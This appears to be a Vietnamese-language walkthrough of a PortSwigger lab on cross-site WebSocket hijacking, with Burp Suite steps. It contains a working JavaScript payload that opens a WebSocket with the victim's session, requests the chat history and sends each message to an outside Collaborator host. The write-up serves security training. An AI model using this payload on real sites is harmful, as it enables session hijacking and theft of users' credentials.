🧪 **Lab: Cross-site WebSocket Hijacking (PortSwigger)**

🔗 **Lab URL: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab**

🧠 **Phân tích kỹ thuật đề bài**
Ứng dụng là một cửa hàng trực tuyến có tích hợp tính năng live chat sử dụng WebSocket để truyền và nhận tin nhắn theo thời gian thực.

✅ **Điểm yếu bảo mật:**

WebSocket không yêu cầu CSRF token khi handshake.

Cookie phiên của người dùng vẫn được gửi trong quá trình WebSocket handshake từ bất kỳ origin nào.

Cho phép kẻ tấn công tạo một script độc hại khiến trình duyệt của nạn nhân tự động kết nối lại WebSocket bằng session hợp lệ của họ.

🧩 **Mục tiêu**
Sử dụng tính năng Exploit Server để gửi một trang HTML chứa script khai thác đến nạn nhân, đánh cắp lịch sử chat của họ. Trong đó có chứa username và password, từ đó đăng nhập và hoàn thành lab.

🔍 **Bước 1: Quan sát hoạt động của WebSocket**

Truy cập lab, nhấn vào "Live chat".

Gửi một tin nhắn bất kỳ.

Reload lại trang.

Mở Burp Suite → Proxy → WebSockets history:

Quan sát thấy client gửi chuỗi "READY" → server phản hồi bằng toàn bộ lịch sử tin nhắn.

Đây là chuỗi quan trọng mà attacker cần gửi để server gửi lịch sử về.

![image](https://github.com/user-attachments/assets/437785b0-5ee3-458e-bb29-22600978b071)

Mở Burp → Proxy → HTTP history:

Tìm yêu cầu handshake WebSocket (thường là GET /chat với Upgrade: websocket).

Kiểm tra và xác nhận: không có CSRF token trong header.

![image](https://github.com/user-attachments/assets/34d82764-0e63-4957-bb6c-d0cf4d3121c8)

💥 **Bước 2: Khai thác bằng JavaScript**

Truy cập Exploit Server, dán đoạn script sau vào phần Body của payload:

<script>
    var ws = new WebSocket('wss://<your-lab-id>.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<your-collaborator-id>.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
🔧 Lưu ý:

Thay <your-lab-id> bằng lab ID của bạn (copy từ yêu cầu handshake WebSocket).

Thay <your-collaborator-id> bằng Burp Collaborator payload.

🔁 **Quy trình khai thác**

Nạn nhân truy cập trang exploit.

Script chạy trên trình duyệt của nạn nhân.

Trình duyệt tự động mở WebSocket đến /chat với cookie hợp lệ.

Gửi "READY" → nhận toàn bộ lịch sử chat.

Từng tin nhắn được gửi về máy chủ attacker (qua Burp Collaborator).

Attacker thu được thông tin đăng nhập trong nội dung chat.

![image](https://github.com/user-attachments/assets/f2ac2644-962b-47b0-9372-d0ee47e0545f)

🧩 **Bước 3: Đăng nhập và hoàn thành Lab**

Mở Burp → Collaborator tab → Poll now.

Kiểm tra các request chứa lịch sử chat → tìm username và password.

Dùng thông tin đó để đăng nhập và hoàn thành lab.

✅ **Kết luận**

Lỗi WebSocket hijacking xảy ra khi:

WebSocket không kiểm tra Origin hoặc CSRF token.

Trình duyệt gửi cookie tự động trong kết nối WebSocket → cho phép trang bên ngoài "hijack" session hiện tại.

